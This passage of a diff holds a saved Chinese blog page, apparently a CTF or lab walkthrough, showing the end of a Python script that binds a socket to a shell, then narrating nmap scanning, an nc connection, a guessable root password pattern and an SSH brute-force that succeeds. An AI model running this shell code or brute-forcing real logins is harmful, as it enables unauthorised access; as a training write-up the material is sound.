+	os.dup2(cli, 1)
+	print 'Out, '
+	os.dup2(cli, 2)
+	print 'Err'	
+	print 'Done'
+	arg0='/bin/sh'
+	arg1='-a'
+	args=[arg0]+[arg1]
+	os.execv(arg0, args)
+except(socket.error):
+	print 'fail\n'
+	conn.close()
+	sys.exit(1)</pre>
+<p>使用nmap扫描，发现端口开启了</p>
+<p><img alt="image.png" data-original="images/20190804/1564881052_5d46309c4ef51.png" src="images/20190804/1564881052_5d46309c4ef51.png" width="1200" height="387" />使用nc进行连接</p>
+<noscript><img alt="image.png" src="images/20190804/1564881052_5d46309c4ef51.png" width="1200" height="387" />使用nc进行连接</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564881122_5d4630e26bd61.png" src="images/20190804/1564881122_5d4630e26bd61.png" width="701" height="243" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564881122_5d4630e26bd61.png" width="701" height="243" /></p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564881336_5d4631b8995f4.png" src="images/20190804/1564881336_5d4631b8995f4.png" width="1185" height="622" />他这个命令是随机生成一个密码重置</p>
+<noscript><img alt="image.png" src="images/20190804/1564881336_5d4631b8995f4.png" width="1185" height="622" />他这个命令是随机生成一个密码重置</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564881561_5d463299b8808.png" src="images/20190804/1564881561_5d463299b8808.png" width="1200" height="185" />唯一变化就是最后两个数字</p>
+<noscript><img alt="image.png" src="images/20190804/1564881561_5d463299b8808.png" width="1200" height="185" />唯一变化就是最后两个数字</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564881601_5d4632c109512.png" src="images/20190804/1564881601_5d4632c109512.png" width="1168" height="241" />也就是说，它的root密码就是前面那些字符+随机两位数字，我们用python生成一下字典</p>
+<noscript><img alt="image.png" src="images/20190804/1564881601_5d4632c109512.png" width="1168" height="241" />也就是说，它的root密码就是前面那些字符+随机两位数字，我们用python生成一下字典</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564881939_5d46341322a8a.png" src="images/20190804/1564881939_5d46341322a8a.png" width="1033" height="700" />爆破ssh</p>
+<noscript><img alt="image.png" src="images/20190804/1564881939_5d46341322a8a.png" width="1033" height="700" />爆破ssh</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564882525_5d46365d34e49.png" src="images/20190804/1564882525_5d46365d34e49.png" width="1200" height="260" />成功登录</p>
+<noscript><img alt="image.png" src="images/20190804/1564882525_5d46365d34e49.png" width="1200" height="260" />成功登录</p></noscript>
+<p><img alt="image.png" data-original="images/20190804/1564882562_5d46368277ed7.png" src="images/20190804/1564882562_5d46368277ed7.png" width="916" height="315" /></p>
+<noscript><img alt="image.png" src="images/20190804/1564882562_5d46368277ed7.png" width="916" height="315" /></p></noscript>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num"></p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="210309" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
+                                                    </div>
+                        <div class="wechatcodeDiv">
